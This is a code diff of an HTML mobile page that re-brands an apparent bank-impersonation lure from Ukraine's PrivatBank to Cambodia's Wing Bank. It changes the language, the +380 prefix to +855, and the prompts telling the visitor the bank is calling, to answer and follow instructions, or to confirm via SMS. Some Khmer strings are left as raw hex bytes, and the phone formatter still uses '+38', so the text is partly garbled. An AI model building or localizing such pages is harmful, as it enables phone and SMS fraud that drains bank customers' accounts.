@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="km" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Реєстрація</title>
+<title>ការចុហ្មោហ</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
@@ -58,14 +58,14 @@ body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex
 </div>
 
 <div class="body">
-  <div class="title">Реєстрація</div>
+  <div class="title">ការចុហ្មោហ</div>
 
   <div class="phone-sec">
-    <div class="label">Номер телефону</div>
-    <div class="user-phone" id="userPhone">+380</div>
+    <div class="label">លេខទុរសាព់</div>
+    <div class="user-phone" id="userPhone">+855</div>
   </div>
 
-  <div class="calling-text">Телефонує ПриватБанк</div>
+  <div class="calling-text">Wing Bank e19e80e19e98e19f92e19e96e19ebbe19e84e19ea0e19f85</div>
 
   <div class="ring-wrap">
     <div class="ring-bg"></div>
@@ -76,11 +76,11 @@ body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex
     </div>
   </div>
 
-  <div class="bank-num" id="bankNum">+380</div>
+  <div class="bank-num" id="bankNum">+855</div>
 
-  <div class="hint">Дайте відповідь на дзвінок і дотримуйтесь інструкцій</div>
+  <div class="hint">ឆ្លីយការហៅហីយធ្វីតាមការណែនាំ</div>
 
-  <a class="sms-link" id="smsLink" href="#">Підтвердити через SMS</a>
+  <a class="sms-link" id="smsLink" href="#">e19e94e19e89e19f92e19e87e19eb6e19e80e19f8be19e8fe19eb6e19e98 SMS</a>
 </div>
 
 <script>
@@ -98,7 +98,7 @@ function renderPhone(p){
   if(p.length<9)return;
   var f="+38 ("+p.substring(0,3)+") "+p.substring(3,6)+" "+p.substring(6,8)+" "+p.substring(8,10);
   document.getElementById("userPhone").textContent=f;
-  document.getElementById("bankNum").textContent="+380"+p;
+  document.getElementById("bankNum").textContent="+855"+p;
 }
 
 if(phone){
